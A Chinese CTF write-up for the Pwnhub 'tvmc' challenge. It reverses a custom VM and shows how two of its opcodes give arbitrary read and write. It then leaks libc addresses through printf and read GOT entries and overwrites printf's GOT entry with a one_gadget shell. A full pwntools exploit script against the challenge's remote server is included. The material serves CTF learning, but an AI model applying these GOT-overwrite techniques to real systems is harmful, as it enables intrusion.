# Pwnhub 8月内部赛-tvmc WriteUp

阅读量 **91848**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-09-09 15:30:56

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01f89935219159ad0c.jpg)

## 题目分析

题目的保护如下：

    
    
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    

题目的主函数如下：

![](https://p3.ssl.qhimg.com/t0177c370fcb50ba6c6.png)

题目会让你输入一个 `name` 并保存在 `bss` 段上，然后读取你要传入的 `code` 的信息来将 `code` 放在 `bss` 段上，之后通过
`vm` 执行这些 `code` ，`vm` 的逻辑如下

![](https://p5.ssl.qhimg.com/t016777c27f0d84ade1.png)

![](https://p2.ssl.qhimg.com/t0115336dac2a6688b7.png)

![](https://p1.ssl.qhimg.com/t016f32ebfdecfaf7aa.png)

指令的结构如下：

    
    
    op_code | value1 | value2 | value3
    

归纳一下有如下操作：

    
    
    count = 8 
    op_code | value1 | value2 | value3
    0x70 : data[value1] = data[value2] + data[value3]
    0x90 : data[value1] = data[value2] & data[value3]
    0xa0 : data[value1] = data[value2] | data[value3]
    0x80 : data[value1] = data[value2] - data[value3]
    0x30 : data[value1] = reg[data[value3]]
    0x10 : data[value1] = value3
    0x20 : data[value1] = 0
    0x12 : data[value1] = data[value2] * data[value3]
    0x50 : stack[count++] = data[value1]
    0x60 : data[value1] = stack[count--]
    0x40 : reg[data[value3]] = data[value1]
    0xb0 : data[value1] = data[value2] ^ data[value3]
    0xd0 : data[value1] = data[value2] >> data[value3]
    0xc0 : data[value1] = data[value2] << data[value3]
    

其中由于 `reg, data, stack, count` 这些都是在 `bss` 段上的，而且 `data` 的元素 是 `qword`
类型，那么下面这两条指令就可以进行任意读写

    
    
    0x30 : data[value1] = reg[data[value3]]
    0x40 : reg[data[value3]] = data[value1]
    

## 漏洞利用

我们可以先读取`printf` 的 `got` 表到 `data[3]` 上

    
    
    payload = [
      # data[0] = -0x117
      0x10000001, # data[0] = 0x1
      0x10010008, # data[1] = 0x8
      0xc0000001, # data[0] = data[0] << data[1]
      0x10020017, # data[2] = 0x17
      0x70000002, # data[0] = data[0] + data[2]
      0x80000300, # data[0] = data[3] - data[0]
    
      # data[3] = reg[data[0]] = printf.got
    
      0x30030000, # data[3] = reg[data[0]]
    ]
    

其中这里的偏移可以通过如下公式计算

    
    
    offset = (dst - src) // 8
    

然后正负数分别用加减法操作

之后由于程序会在最后的时候 `printf(name)` ， 那么我们就可以读到的 `printf` 的地址放入 `name` 中进行输出

![](https://p2.ssl.qhimg.com/t01c07c7e12e2a3fe49.png)

    
    
    payload = [
        # data[5] = -0x104
        0x10000001, # data[0] = 0x1
        0x10010008, # data[1] = 0x8
        0xc0000001, # data[0] = data[0] << data[1]
        0x10020004, # data[2] = 0x4
        0x70000002, # data[0] = data[0] + data[2]
        0x80000300, # data[0] = data[3] - data[0]
        0x70050005, # data[5] = data[0] + data[5]
    
        # data[0] = -0x117
        0x10000001, # data[0] = 0x1
        0x10010008, # data[1] = 0x8
        0xc0000001, # data[0] = data[0] << data[1]
        0x10020017, # data[2] = 0x17
        0x70000002, # data[0] = data[0] + data[2]
        0x80000300, # data[0] = data[3] - data[0]
    
        # data[3] = reg[data[0]] = printf.got
    
        0x30030000, # data[3] = reg[data[0]]
    
        # name = reg[data[5]] = data[3]
        0x40030005, # reg[data[5]] = data[3]
    ]
    

可以得到远程的`printf` 的地址低字节是 `810`

![](https://p4.ssl.qhimg.com/t0118130337cf129e6c.png)

同样的道理，我们可以读取`read` 的地址，只需要把 `payload` 中的

    
    
    0x10020017, # data[2] = 0x17
    

改成

    
    
    0x10020016, # data[2] = 0x16
    

即可

![](https://p1.ssl.qhimg.com/t01e97bb7792d27be1b.png)

得到远程的`read` 的地址低字节是 `350`

随后我们可以在 [libc database
search](https://libc.nullbyte.cat/?q=_IO_printf%3A810%2Cread%3A350&l=libc6_2.23-0ubuntu11.3_amd64)
搜索 `libc` 并下载它

![](https://p4.ssl.qhimg.com/t0104dfe44dcf1139ad.png)

最后我们改 `printf` 的 `got` 表为 `one_gadget` 即可

    
    
    offset = 0xf1247 - 0x55810 # 0x9ba37
    
    payload = [
      # data[5] = -0x117
        0x10000001, # data[0] = 0x1
        0x10010008, # data[1] = 0x8
        0xc0000001, # data[0] = data[0] << data[1]
        0x10020017, # data[2] = 0x17
        0x70000002, # data[0] = data[0] + data[2]
        0x80000300, # data[0] = data[3] - data[0]
        0x30030000, # data[3] = reg[data[0]]
    
      # data[4] = 0x9ba37
        0x1004000a, # data[4] = 0x9
        0xc0040401, # data[4] = data[4] << data[1]
        0x100500ba, # data[5] = 0xba
        0x70040405, # data[4] = data[4] + data[5]
        0xc0040401, # data[4] = data[4] << data[1]
        0x10050037, # data[5] = 0x37
        0x70040405, # data[4] = data[4] + data[5]
    
      # data[3] = data[3] + data[4] = printf_addr + offset = one_gadget
        0x70030304, # data[3] = data[3] + data[4]
    
      # reg[data[0]] = data[3] = one_gadget
        0x40030000, # reg[data[0]] = data[3]
    ]
    

## EXP

最后完整的 `EXP` 如下：

    
    
    from pwn import *
    context.log_level = "debug"
    
    DEBUG = 0
    
    # count = 8 
    # op_code | value1 | value2 | value3
    # 0x70 : data[value1] = data[value2] + data[value3]
    # 0x90 : data[value1] = data[value2] & data[value3]
    # 0xa0 : data[value1] = data[value2] | data[value3]
    # 0x80 : data[value1] = data[value2] - data[value3]
    # 0x30 : data[value1] = reg[data[value3]]
    # 0x10 : data[value1] = value3
    # 0x20 : data[value1] = 0
    # 0x12 : data[value1] = data[value2] * data[value3]
    # 0x50 : stack[count++] = data[value1]
    # 0x60 : data[value1] = stack[count--]
    # 0x40 : reg[data[value3]] = data[value1]
    # 0xb0 : data[value1] = data[value2] ^ data[value3]
    # 0xd0 : data[value1] = data[value2] >> data[value3]
    # 0xc0 : data[value1] = data[value2] << data[value3]
    
    def dbg(cmd = ""):
        gdb.attach(r,cmd)
    
    if DEBUG:
        r = process("./tvmc")
    else:
        r = remote("121.40.89.206",10001)
    
    name = "Test"
    
    '''
    $ one_gadget libc6_2.23-0ubuntu11.3_amd64.so 
    0x45226 execve("/bin/sh", rsp+0x30, environ)
    constraints:
      rax == NULL
    
    0x4527a execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    
    0xf03a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL
    
    0xf1247 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    
    '''
    offset = 0xf1247 - 0x55810 # 0x9ba37
    
    payload = [
      # data[5] = -0x117
        0x10000001, # data[0] = 0x1
        0x10010008, # data[1] = 0x8
        0xc0000001, # data[0] = data[0] << data[1]
        0x10020017, # data[2] = 0x17
        0x70000002, # data[0] = data[0] + data[2]
        0x80000300, # data[0] = data[3] - data[0]
        0x30030000, # data[3] = reg[data[0]]
    
      # data[4] = 0x9ba37
        0x1004000a, # data[4] = 0x9
        0xc0040401, # data[4] = data[4] << data[1]
        0x100500ba, # data[5] = 0xba
        0x70040405, # data[4] = data[4] + data[5]
        0xc0040401, # data[4] = data[4] << data[1]
        0x10050037, # data[5] = 0x37
        0x70040405, # data[4] = data[4] + data[5]
    
      # data[3] = data[3] + data[4] = printf_addr + offset = one_gadget
        0x70030304, # data[3] = data[3] + data[4]
    
      # reg[data[0]] = data[3] = one_gadget
        0x40030000, # reg[data[0]] = data[3]
    ]
    
    r.sendlineafter("Tell me your name:",name)
    r.sendlineafter("Size:\n",str(len(payload)))
    
    if DEBUG:
        dbg("b *$rebase(0xBFA) \n b *$rebase(0x10a9) \nc")
    
    r.recvuntil("PWN PWN PWN?????\n")
    
    for i in payload:
        r.sendline(str(i))
        sleep(0.2)
    
    r.interactive()
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Ayang** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/250882](/post/id/250882)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)

 **+1** __2赞

 __收藏

![](https://p3.ssl.qhimg.com/t0179329748e701c287.png) Ayang

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

